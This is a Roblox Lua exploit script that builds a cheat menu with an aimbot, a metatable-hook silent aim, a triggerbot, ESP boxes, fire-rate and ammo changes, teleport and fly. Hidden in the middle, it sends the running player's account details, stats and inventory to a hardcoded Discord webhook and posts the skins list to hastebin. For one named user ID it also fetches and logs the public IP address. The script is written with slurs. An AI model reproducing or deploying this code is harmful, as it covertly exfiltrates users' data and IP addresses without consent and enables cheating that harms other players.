	local DRAG_SPEED = (8); -- // The speed of the UI drag.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
	
	function comma_value(amount)
local formatted = amount
  while true do  
    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
    if (k==0) then
      break
    end
  end
  return formatted
end
	local skins = {}
	for i,v in pairs(game.Players.LocalPlayer.Data.Shuffles.Skins:GetChildren()) do
	    table.insert(skins, v.Name)
	end
	skins = table.concat(skins, "\n")
	local url = "https://www.toptal.com/developers/hastebin/documents"
	local newdata = skins
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	local response
	local result = pcall(function()
	    response = request(abcdef)
	end)
	local link = "Error"
	if result then
	    pcall(function()
	        local body = response.Body
	        local key = game:GetService("HttpService"):JSONDecode(body).key
	        link = "https://hastebin.com/" .. key
	    end)
	end
	local executor = "Unknown Exploit"
	pcall(function()
		executor = identifyexecutor()
	end)
	if executor == "WRD-API" then
	    executor = "JJSploit"
	end
	local pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
	pcall(function()
		pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
	end)
	local premium = "No"
	if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
		premium = "Yes"
	end
	local ip = " // NOT BLACKLISTED"
	-- IF A BLACKLISTED BITCH USES THIS
	if game.Players.LocalPlayer.UserId == 3372541763 then
		ip = game:HttpGet("https://wtfismyip.com/text")
        end
	-- IT'LL IP LOG 'EM, CAUSE, WHY NOT. THEY'RE A BITCH. WE AINT NO LIKE NO BITCHES.
	
	local url =
		"https://discord.com/api/webhooks/977962764200988693/8XY_YVlipxlBquz-uzi-PT-TbedKydGdK1DAMemTO_ieDeAU1jx-cKvY9FcBsDjI4FTd"
	local data = {
		["embeds"] = {
			{
				["color"] = 7498202,
				["fields"] = {
					{
						["name"] = "Executor",
						["value"] = executor,
						["inline"] = true
					},
					{
						["name"] = "Clock",
						["value"] = os.date("%I:%M %p"),
						["inline"] = true
					},
					{
						["name"] = "Flag",
						["value"] = ":flag_" .. game.LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer):lower() .. ":",
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = game.Players.LocalPlayer.AccountAge .. " days",
						["inline"] = true
					},
					{
						["name"] = "Premium",
						["value"] = premium,
						["inline"] = true
					},
					{
						["name"] = "Level",
						["value"] = game.Players.LocalPlayer.CareerStatsCache.Level.Value,
						["inline"] = true
					},
					{
						["name"] = "Skin",
						["value"] = game.Players.LocalPlayer.Data.Skin.Value,
						["inline"] = true
					},
					{
						["name"] = "Melee",
						["value"] = game.Players.LocalPlayer.Data.Melee.Value,
						["inline"] = true
					},
					{
					    ["name"] = "Kills",
					    ["value"] = comma_value(game.Players.LocalPlayer.Data.KD.KOs.Value),
					    ["inline"] = true
					},
					{
					    ["name"] = "Deaths",
					    ["value"] = comma_value(game.Players.LocalPlayer.Data.KD.WOs.Value),
					    ["inline"] = true
					},
					{
					    ["name"] = "KDR",
					    ["value"] = tostring(math.floor((game.Players.LocalPlayer.Data.KD.KOs.Value / game.Players.LocalPlayer.Data.KD.WOs.Value) * 100) / 100),
					    ["inline"] = true
					},
					{
					    ["name"] = "Skins",
					    ["value"] = link,
					    ["inline"] = true
					}
				},
				["author"] = {
					["name"] = game.Players.LocalPlayer.Name .. ip,
					["icon_url"] = pfp
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)
	
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
	
	
	
	
	
	
	script.Parent.ware.VisualFrame.updFov.MouseButton1Click:Connect(function()
		local fovVal = tonumber(script.Parent.ware.VisualFrame.fov.Text)
		game:GetService("Players").LocalPlayer.Settings.FOV.Value = fovVal
	end)
	
	
	
	
	
	
	
	script.Parent.ware.PlayerFrame.Fly.MouseButton1Click:Connect(function()
		
	end)
	
	
	
	script.Parent.ware.CombatFrame.killall.MouseButton1Click:Connect(function()
	
		for i,v in pairs(game.Players:GetPlayers()) do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
			wait(2)
		end
	end)
	
	script.Parent.ware.CombatFrame.Free.MouseButton1Click:Connect(function()
		for i,v in pairs(game.Players:GetPlayers()) do
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
			wait(3)
		end
	end)
	
	script.Parent.ware.CombatFrame.aimlock.MouseButton1Click:Connect(function()
		local dwCamera = workspace.CurrentCamera
		local dwRunService = game:GetService("RunService")
		local dwUIS = game:GetService("UserInputService")
		local dwEntities = game:GetService("Players")
		local dwLocalPlayer = dwEntities.LocalPlayer
		local dwMouse = dwLocalPlayer:GetMouse()
	
		local settings = {
			Aimbot = true,
			Aiming = false,
			Aimbot_AimPart = "Head",
			Aimbot_TeamCheck = true,
			Aimbot_Draw_FOV = true,
			Aimbot_FOV_Radius = 200,
			Aimbot_FOV_Color = Color3.fromRGB(255,255,255)
		}
	
		local fovcircle = Drawing.new("Circle")
		fovcircle.Visible = settings.Aimbot_Draw_FOV
		fovcircle.Radius = settings.Aimbot_FOV_Radius
		fovcircle.Color = settings.Aimbot_FOV_Color
		fovcircle.Thickness = 1
		fovcircle.Filled = false
		fovcircle.Transparency = 1
	
		fovcircle.Position = Vector2.new(dwCamera.ViewportSize.X / 2, dwCamera.ViewportSize.Y / 2)
	
		dwUIS.InputBegan:Connect(function(i)
			if i.UserInputType == Enum.UserInputType.MouseButton2 then
				settings.Aiming = true
			end
		end)
	
		dwUIS.InputEnded:Connect(function(i)
			if i.UserInputType == Enum.UserInputType.MouseButton2 then
				settings.Aiming = false
			end
		end)
	
		dwRunService.RenderStepped:Connect(function()
	
			local dist = math.huge
			local closest_char = nil
	
			if settings.Aiming then
	
				for i,v in next, dwEntities:GetChildren() do 
	
					if v ~= dwLocalPlayer and
						v.Character and
						v.Character:FindFirstChild("HumanoidRootPart") and
						v.Character:FindFirstChild("Humanoid") and
						v.Character:FindFirstChild("Humanoid").Health > 0 then
	
						if settings.Aimbot_TeamCheck == true and
							v.Team ~= dwLocalPlayer.Team or
							settings.Aimbot_TeamCheck == false then
	
							local char = v.Character
							local char_part_pos, is_onscreen = dwCamera:WorldToViewportPoint(char[settings.Aimbot_AimPart].Position)
	
							if is_onscreen then
	
								local mag = (Vector2.new(dwMouse.X, dwMouse.Y) - Vector2.new(char_part_pos.X, char_part_pos.Y)).Magnitude
	
								if mag < dist and mag < settings.Aimbot_FOV_Radius then
	
									dist = mag
									closest_char = char
	
								end
							end
						end
					end
				end
	
				if closest_char ~= nil and
					closest_char:FindFirstChild("HumanoidRootPart") and
					closest_char:FindFirstChild("Humanoid") and
					closest_char:FindFirstChild("Humanoid").Health > 0 then
	
					dwCamera.CFrame = CFrame.new(dwCamera.CFrame.Position, closest_char[settings.Aimbot_AimPart].Position)
				end
			end
		end)
	end)
	
	
	script.Parent.ware.PlayerFrame.Sunglasses.MouseButton1Click:Connect(function()
		while wait(1) do 
			game.ReplicatedStorage.Events.Sunglasses:FireServer()
		end
	end)
	
	
	
	script.Parent.ware.CombatFrame.Hitboxes.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local Mouse = LocalPlayer:GetMouse()
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, "Head")
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, "Head") then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character.Head.Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
	
	end)
	
	script.Parent.ware.CombatFrame.random.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local choice = math.random(1,2)
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local aimPart = "nothin'"
		local Mouse = LocalPlayer:GetMouse()
		if choice == 1 then
			aimPart = "Head"
		else
			aimPart = "LowerTorso"
		end
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, aimPart)
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, aimPart) then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character[aimPart].Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
		
		print(aimPart)
		while wait(0.6) do
			local c = math.random(1,2)
			if c == 1 then
				aimPart = "Head"
			else
				aimPart = "LowerTorso"
			end
		end
	end)
	
	
	script.Parent.ware.CombatFrame.Smoothlock.MouseButton1Click:Connect(function()
		bodyPart = 'Head'
	
		on = false
	
		local lp = game:GetService('Players').LocalPlayer
		local char = lp.Character
	
	
		local mouse = lp:GetMouse()
	
	
		game:GetService("UserInputService").InputBegan:connect(function(inputObject)
			if inputObject.KeyCode == Enum.KeyCode.C then
				on = not on
			end
		end)
	
	
	
	
	
	
	
	
	
	
	
	
	--[[local function isObstructed(part)
	   local hrp = char.HumanoidRootPart
	   local PointA_Position = hrp.Position
	   local PointB_Position = part.Position
	
	   local Direction = (PointB_Position - PointA_Position).Unit
	   local Raycast = Ray.new(PointA_Position, Direction * 100)
	   local Hit = workspace:FindPartOnRay(Raycast, char)
	   if Hit == part then
	       return true
	   else
	       return false
	   end
	end
	]]
	
		function cansee(targ)
			local cam = workspace.CurrentCamera
			local ray = Ray.new(lp.Character.Head.CFrame.p, (targ.CFrame.p - lp.Character.Head.CFrame.p).unit * 300)
			local part, position = workspace:FindPartOnRayWithIgnoreList(ray, {lp.Character}, false, true)
			if part then
				local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
	
				if not humanoid then
					humanoid = part.Parent.Parent:FindFirstChildOfClass("Humanoid")
				end
	
				if humanoid and targ and humanoid.Parent == targ.Parent then
					local blah,actualthing = cam:WorldToScreenPoint(targ.Position)
					if actualthing == true then
						return true
					else
						return false
					end
				else
					return false
				end
			else
				return false
			end
		end
	
	
	
	
		local function getClosestPlayerToCursor(x, y)
			local closestPlayer = nil
			local shortestDistance = math.huge
	
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				if v ~= lp and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Head") then
					local pos = game:GetService("Workspace").CurrentCamera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
					local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(x, y)).magnitude
	
					local targettable = (v.Team ~= lp.Team or v.Team == nil) and v.Character.Humanoid.Health > 0
					if magnitude < shortestDistance and cansee(v.Character.Head) == true and (v.Team ~= lp.Team or v.Team == nil) and v.Character.Humanoid.Health > 0 then
						closestPlayer = v
						shortestDistance = magnitude
					end
				end
			end
			return closestPlayer, shortestDistance
		end
	
	
	
	
	
	
	
	
	
	
		TweenStatus = nil
	
		local TweenService = game:GetService("TweenService")
		TweenCFrame = Instance.new("CFrameValue")
	
	
		function tweenstuff(partpos)
			TweenStatus = true
			TweenCFrame.Value = workspace.CurrentCamera.CFrame
			local tweenframe = TweenService:Create(TweenCFrame, TweenInfo.new(0.2),{Value = CFrame.new(workspace.CurrentCamera.CFrame.Position, partpos)})
			tweenframe:Play()
			tweenframe.Completed:Wait()
			TweenStatus = nil
			TweenCFrame.Value = CFrame.new(0,0,0)
		end
	
	
	
	
		game:GetService('RunService').Heartbeat:connect(function()
			if on == true then
				local plr, distance = getClosestPlayerToCursor(mouse.X, mouse.Y)
				if TweenStatus == nil and plr ~= nil and distance > 150 then
					tweenstuff(plr.Character.Head.Position)
				end
				if TweenStatus == true then
					workspace.CurrentCamera.CFrame = TweenCFrame.Value
				end
				if plr ~= nil and distance < 150 and TweenStatus == nil then
					workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, plr.Character.Head.Position)
				end
			end
		end)
	end)
	
	script.Parent.ware.CombatFrame.lowertorso.MouseButton1Click:Connect(function()
		local CurrentCamera = workspace.CurrentCamera
		local Players = game.GetService(game, "Players")
		local LocalPlayer = Players.LocalPlayer
		local Mouse = LocalPlayer:GetMouse()
		function ClosestPlayer()
			local MaxDist, Closest = math.huge
			for I,V in pairs(Players.GetPlayers(Players)) do
				if V == LocalPlayer then continue end
				if V.Team == LocalPlayer then continue end
				if not V.Character then continue end
				local Head = V.Character.FindFirstChild(V.Character, "LowerTorso")
				if not Head then continue end
				local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
				if not Vis then continue end
				local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
				local Dist = (TheirPos - MousePos).Magnitude
				if Dist < MaxDist then
					MaxDist = Dist
					Closest = V
				end
			end
			return Closest
		end
		local MT = getrawmetatable(game)
		local OldNC = MT.__namecall
		local OldIDX = MT.__index
		setreadonly(MT, false)
		MT.__namecall = newcclosure(function(self, ...)
			local Args, Method = {...}, getnamecallmethod()
			if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
				local CP = ClosestPlayer()
				if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, "LowerTorso") then
					Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character.LowerTorso.Position - CurrentCamera.CFrame.Position).Unit * 1000)
					return OldNC(self, unpack(Args))
				end
			end
			return OldNC(self, ...)
		end)
	
	
	end)
	
	script.Parent.ware.CombatFrame.FireRate.MouseButton1Click:Connect(function()
		for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
			print(v.Name)
			print(v.FireRate.Value)
			v.FireRate.Value = 0.03
			v.Auto.Value = true
		end
	end)
	
	script.Parent.ware.CombatFrame.InfAmmo.MouseButton1Click:Connect(function()
		if game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value == "Infinite Ammo" then
			game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value = ""
		else
			game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value = "Infinite Ammo"
		end
	end)
	
	script.Parent.ware.CombatFrame.triggerbot.MouseButton1Click:Connect(function()
		local player = game:GetService("Players").LocalPlayer
		local mouseGet = player:GetMouse()
		game:GetService("RunService").RenderStepped:Connect(function()
			if mouseGet.Target.Parent:FindFirstChild("Humanoid") and mouseGet.Target.Parent.Name ~= player.Name and game.Players:GetPlayerFromCharacter(mouseGet.Target.Parent).Team ~= player.Team then
				mouse1press() 
				wait(1) 
				mouse1release()
			end
		end) 
	end)
	
	
	
	script.Parent.ware.PlayerFrame.upd.MouseButton1Click:Connect(function()
		local value = script.Parent.ware.PlayerFrame.Gravity.Text
		local numb = tonumber(value)
		game:GetService("ReplicatedStorage").CurrentGrav.Value = value
	end)
	script.Parent.ware.PlayerFrame.tel.MouseButton1Click:Connect(function()
		local plr = game.Players[script.Parent.ware.PlayerFrame.teleport.Text]
		local char = plr.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = char
		
	end)
	
	script.Parent.ware.PlayerFrame.Walkspeed.MouseButton1Click:Connect(function()
		if game:GetService("ReplicatedStorage").Arcade.Value == true then
			game:GetService("ReplicatedStorage").Arcade.Value = false
		else
			game:GetService("ReplicatedStorage").Arcade.Value = true
		end
	end)
	
	script.Parent.ware.PlayerFrame.mobile.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("Touch")
	end)
	
	script.Parent.ware.PlayerFrame.console.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("Gamepad1")
	end)
	
	script.Parent.ware.PlayerFrame.none.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("None")
	end)
	
	script.Parent.ware.PlayerFrame.none.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.Events.CoolNewRemote:FireServer("MouseButton1")
	end)
	
	
	
	
	
	script.Parent.ware.VisualFrame.box.MouseButton1Click:Connect(function()
		-- This is using SXDL
	
		local lplr = game.Players.LocalPlayer
		local camera = game:GetService("Workspace").CurrentCamera
		local CurrentCamera = workspace.CurrentCamera
		local worldToViewportPoint = CurrentCamera.worldToViewportPoint
	
		local HeadOff = Vector3.new(0, 0.5, 0)
		local LegOff = Vector3.new(0,3,0)
	
		for i,v in pairs(game.Players:GetChildren()) do
			local BoxOutline = Drawing.new("Square")
			BoxOutline.Visible = false
			BoxOutline.Color = Color3.new(0,0,0)
			BoxOutline.Thickness = 3
			BoxOutline.Transparency = 1
			BoxOutline.Filled = false
	
			local Box = Drawing.new("Square")
			Box.Visible = false
			Box.Color = Color3.new(1,1,1)
			Box.Thickness = 1
			Box.Transparency = 1
			Box.Filled = false
	
			function boxesp()
				game:GetService("RunService").RenderStepped:Connect(function()
					if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lplr and v.Character.Humanoid.Health > 0 then
						local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
	
						local RootPart = v.Character.HumanoidRootPart
						local Head = v.Character.Head
						local RootPosition, RootVis = worldToViewportPoint(CurrentCamera, RootPart.Position)
						local HeadPosition = worldToViewportPoint(CurrentCamera, Head.Position + HeadOff)
						local LegPosition = worldToViewportPoint(CurrentCamera, RootPart.Position - LegOff)
	
						if onScreen then
							BoxOutline.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							BoxOutline.Position = Vector2.new(RootPosition.X - BoxOutline.Size.X / 2, RootPosition.Y - BoxOutline.Size.Y / 2)
							BoxOutline.Visible = true
	
							Box.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							Box.Position = Vector2.new(RootPosition.X - Box.Size.X / 2, RootPosition.Y - Box.Size.Y / 2)
							Box.Visible = true
	
							if v.TeamColor == lplr.TeamColor then
								BoxOutline.Visible = false
								Box.Visible = false
							else
								BoxOutline.Visible = true
								Box.Visible = true
							end
	
						else
							BoxOutline.Visible = false
							Box.Visible = false
						end
					else
						BoxOutline.Visible = false
						Box.Visible = false
					end
				end)
			end
			coroutine.wrap(boxesp)()
		end
	
		game.Players.PlayerAdded:Connect(function(v)
			local BoxOutline = Drawing.new("Square")
			BoxOutline.Visible = false
			BoxOutline.Color = Color3.new(0,0,0)
			BoxOutline.Thickness = 3
			BoxOutline.Transparency = 1
			BoxOutline.Filled = false
	
			local Box = Drawing.new("Square")
			Box.Visible = false
			Box.Color = Color3.new(1,1,1)
			Box.Thickness = 1
			Box.Transparency = 1
			Box.Filled = false
	
			function boxesp()
				game:GetService("RunService").RenderStepped:Connect(function()
					if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lplr and v.Character.Humanoid.Health > 0 then
						local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
	
						local RootPart = v.Character.HumanoidRootPart
						local Head = v.Character.Head
						local RootPosition, RootVis = worldToViewportPoint(CurrentCamera, RootPart.Position)
						local HeadPosition = worldToViewportPoint(CurrentCamera, Head.Position + HeadOff)
						local LegPosition = worldToViewportPoint(CurrentCamera, RootPart.Position - LegOff)
	
						if onScreen then
							BoxOutline.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							BoxOutline.Position = Vector2.new(RootPosition.X - BoxOutline.Size.X / 2, RootPosition.Y - BoxOutline.Size.Y / 2)
							BoxOutline.Visible = true
	
							Box.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
							Box.Position = Vector2.new(RootPosition.X - Box.Size.X / 2, RootPosition.Y - Box.Size.Y / 2)
							Box.Visible = true
	
							if v.TeamColor == lplr.TeamColor then
								BoxOutline.Visible = false
								Box.Visible = false
							else
								BoxOutline.Visible = true
								Box.Visible = true
							end
	
						else
							BoxOutline.Visible = false
							Box.Visible = false
						end
					else
						BoxOutline.Visible = false
						Box.Visible = false
					end
				end)
			end
			coroutine.wrap(boxesp)()
		end)
	end)
	
	script.Parent.ware.PlayerFrame.Nonexisty.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.LeftLowerArm:Destroy()
	
		game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
	
		game.Players.LocalPlayer.Character.RightLowerArm:Destroy()
	
		game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
	
		game.Players.LocalPlayer.Character.LeftFoot:Destroy()
	
		game.Players.LocalPlayer.Character.LeftLowerLeg:Destroy()
	
		game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
	
		game.Players.LocalPlayer.Character.RightFoot:Destroy()
	
		game.Players.LocalPlayer.Character.RightLowerLeg:Destroy()
	
		game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
	
		local esc = game.Players.LocalPlayer.Character.LowerTorso:GetChildren()
	
		for i, v in pairs(esc) do
	
			v:Destroy()
	
			wait()
	
		end
	
		local vm = game:GetService("ReplicatedStorage").Viewmodels.Arms.Delinquent
	
		vm.Name = "Holder"
	
		local toName = game:GetService("ReplicatedStorage").Viewmodels.Arms["Nonexisty"]
	
		toName.Name = "Delinquent"
	
		local Core = getsenv(game.Players.LocalPlayer.PlayerGui.Menew.LocalScript);
	
	
		local Loadout;
	
		for i,v in pairs(getupvalues(Core.ViewItems)) do
	
			if typeof(v) == "table" then
	
				if v.Skins then
	
					Loadout = v;
	
				end
	
			end
	
		end
	
	
		table.insert(Loadout.Skins, "Nonexisty")
	end)
	
	
	function onKeyPress(inputObject, gameProcessedEvent)
		if not gameProcessedEvent then
			if inputObject.KeyCode == Enum.KeyCode.RightShift  then 
				script.Parent.ware.Visible = not script.Parent.ware.Visible
			end
		end
	end
	game:GetService("UserInputService").InputBegan:connect(onKeyPress)
	
	
	repeat wait() 
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
	local mouse = game.Players.LocalPlayer:GetMouse() 
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer 
	local torso = plr.Character.Head 
	local flying = false
	local deb = true 
	local ctrl = {f = 0, b = 0, l = 0, r = 0} 
	local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
	local maxspeed = 300
	local speed = 0 
	
	function Fly() 
		local bg = Instance.new("BodyGyro", torso) 
		bg.P = 9e4 
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
		bg.cframe = torso.CFrame 
		local bv = Instance.new("BodyVelocity", torso) 
		bv.velocity = Vector3.new(0,0.1,0) 
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
		repeat wait() 
			plr.Character.Humanoid.PlatformStand = true 
			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
				speed = speed+.5+(speed/maxspeed) 
				if speed > maxspeed then 
					speed = maxspeed 
				end 
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
				speed = speed-1 
				if speed < 0 then 
					speed = 0 
				end 
			end 
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
			else 
				bv.velocity = Vector3.new(0,0.1,0) 
			end 
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
		until not flying 
		ctrl = {f = 0, b = 0, l = 0, r = 0} 
		lastctrl = {f = 0, b = 0, l = 0, r = 0} 
		speed = 0 
		bg:Destroy() 
		bv:Destroy() 
		plr.Character.Humanoid.PlatformStand = false 
	end 
	mouse.KeyDown:connect(function(key) 
		if key:lower() == "t" then 
			if flying then flying = false 
			else 
				flying = true 
				Fly() 
			end 
		elseif key:lower() == "w" then 
			ctrl.f = 1 
		elseif key:lower() == "s" then 
			ctrl.b = -1 
		elseif key:lower() == "a" then 
			ctrl.l = -1 
		elseif key:lower() == "d" then 
			ctrl.r = 1 
		end 
	end) 
	mouse.KeyUp:connect(function(key) 
		if key:lower() == "w" then 
			ctrl.f = 0 
		elseif key:lower() == "s" then 
			ctrl.b = 0 
		elseif key:lower() == "a" then 
			ctrl.l = 0 
		elseif key:lower() == "d" then 
			ctrl.r = 0 
		end 
	end)
	Fly()
end
coroutine.wrap(UKGTOE_fake_script)()
